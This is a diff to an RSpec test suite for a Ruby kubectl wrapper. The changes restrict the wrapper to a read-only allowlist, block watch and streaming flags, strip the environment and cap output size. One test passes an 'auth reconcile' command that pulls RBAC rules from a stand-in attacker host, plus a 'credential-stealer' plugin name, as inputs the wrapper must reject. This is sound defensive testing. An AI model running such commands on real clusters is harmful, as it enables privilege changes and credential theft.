@@ -64,13 +64,15 @@ RSpec.describe K8sCluster::Kubectl do
     credential = create_credential
     observed_kubeconfig_path = nil
 
-    allow(runner).to receive(:call) do |env:, argv:, timeout:|
+    allow(runner).to receive(:call) do |env:, argv:, timeout:, max_output_bytes:|
       observed_kubeconfig_path = env.fetch("KUBECONFIG")
 
+      expect(env.keys).to contain_exactly("KUBECONFIG", "PATH", "HOME")
       expect(File.stat(observed_kubeconfig_path).mode & 0o777).to eq(0o600)
       expect(File.read(observed_kubeconfig_path)).to eq(kubeconfig)
       expect(argv).to eq([ "kubectl", "--context", "prod", "--namespace", "default", "get", "pods" ])
       expect(timeout).to eq(K8sCluster::Kubectl::RUN_TIMEOUT_SECONDS)
+      expect(max_output_bytes).to eq(K8sCluster::Kubectl::MAX_OUTPUT_BYTES)
 
       K8sCluster::KubectlRunner::Result.new(stdout: "pods\n", stderr: "", status: 0)
     end
@@ -231,6 +233,9 @@ RSpec.describe K8sCluster::Kubectl do
     [
       [ "get", "pods", "--watch" ],
       [ "get", "pods", "-w" ],
+      [ "get", "pods", "-w=true" ],
+      [ "get", "pods", "--watch-only" ],
+      [ "get", "pods", "--watch-only=true" ],
       [ "logs", "web", "-f" ],
       [ "proxy" ],
       [ "port-forward", "pod/web", "8080:80" ],
@@ -238,43 +243,45 @@ RSpec.describe K8sCluster::Kubectl do
     ].each do |args|
       expect {
         described_class.call(context: context, credential: credential.id, kube_context: "prod", args: args, allow_risky_command: true)
-      }.to raise_error(K8sCluster::Kubectl::RiskyCommand, /streaming or interactive/)
+      }.to raise_error(K8sCluster::Kubectl::RiskyCommand, /streaming or interactive|read-only allowlist/)
     end
     expect(runner).not_to have_received(:call)
   end
 
-  it "requires explicit allowance for mutating kubectl commands" do
+  it "rejects mutating commands even when risky-command allowance is supplied" do
     credential = create_credential
 
     expect {
       described_class.call(context: context, credential: credential.id, kube_context: "prod", args: [ "apply", "-f", "deployment.yaml" ])
-    }.to raise_error(K8sCluster::Kubectl::RiskyCommand, /risky-command allowance/)
-
-    allow(runner).to receive(:call).and_return(K8sCluster::KubectlRunner::Result.new(stdout: "configured\n", stderr: "", status: 0))
-
-    result = described_class.call(
-      context: context,
-      credential: credential.id,
-      kube_context: "prod",
-      args: [ "apply", "-f", "deployment.yaml" ],
-      allow_risky_command: true
-    )
-
-    expect(result[:ok]).to be(true)
-  end
-
-  it "does not let chat callers self-authorize risky commands or secret output" do
-    credential = create_credential(allowed_surfaces: [ "chat" ])
+    }.to raise_error(K8sCluster::Kubectl::RiskyCommand, /read-only allowlist/)
 
     expect {
       described_class.call(
-        context: chat_context,
+        context: context,
         credential: credential.id,
         kube_context: "prod",
-        args: [ "delete", "pod", "web" ],
+        args: [ "apply", "-f", "deployment.yaml" ],
         allow_risky_command: true
       )
-    }.to raise_error(K8sCluster::Kubectl::OperatorConfirmationRequired, /risky commands/)
+    }.to raise_error(K8sCluster::Kubectl::RiskyCommand, /read-only allowlist/)
+  end
+
+  it "allows only read-only auth subcommands and rejects arbitrary kubectl plugins" do
+    credential = create_credential
+    allow(runner).to receive(:call).and_return(K8sCluster::KubectlRunner::Result.new(stdout: "yes\n", stderr: "", status: 0))
+
+    expect(described_class.call(context: context, credential: credential.id, kube_context: "prod", args: [ "auth", "can-i", "get", "pods" ])[:ok]).to be(true)
+    expect(described_class.call(context: context, credential: credential.id, kube_context: "prod", args: [ "auth", "whoami" ])[:ok]).to be(true)
+
+    [ [ "auth", "reconcile", "-f", "https://attacker.example/rbac.yaml" ], [ "credential-stealer" ] ].each do |args|
+      expect {
+        described_class.call(context: context, credential: credential.id, kube_context: "prod", args: args, allow_risky_command: true)
+      }.to raise_error(K8sCluster::Kubectl::RiskyCommand, /read-only allowlist/)
+    end
+  end
+
+  it "does not let chat callers self-authorize secret output" do
+    credential = create_credential(allowed_surfaces: [ "chat" ])
 
     expect {
       described_class.call(
@@ -360,5 +367,26 @@ RSpec.describe K8sCluster::KubectlRunner do
 
     expect(result).not_to be_success
     expect(result.stderr).to include("timed out")
+  end
+
+  it "replaces the inherited environment with the explicit kubectl environment" do
+    result = described_class.call(
+      env: { "KUBECONFIG" => "/tmp/config", "PATH" => ENV.fetch("PATH"), "HOME" => "/tmp" },
+      argv: [ RbConfig.ruby, "-e", 'print [ENV["KUBECONFIG"], ENV["HOME"], ENV["RAILS_ENV"]].inspect' ]
+    )
+
+    expect(result.stdout).to eq('["/tmp/config", "/tmp", nil]')
+  end
+
+  it "drains command output while retaining only the configured byte limit" do
+    result = described_class.call(
+      env: {},
+      argv: [ RbConfig.ruby, "-e", '$stdout.write("o" * 100_000); $stderr.write("e" * 100_000)' ],
+      max_output_bytes: 1.kilobyte
+    )
+
+    expect(result).to be_success
+    expect(result.stdout.bytesize).to eq(1.kilobyte + 1)
+    expect(result.stderr.bytesize).to eq(1.kilobyte + 1)
   end
 end
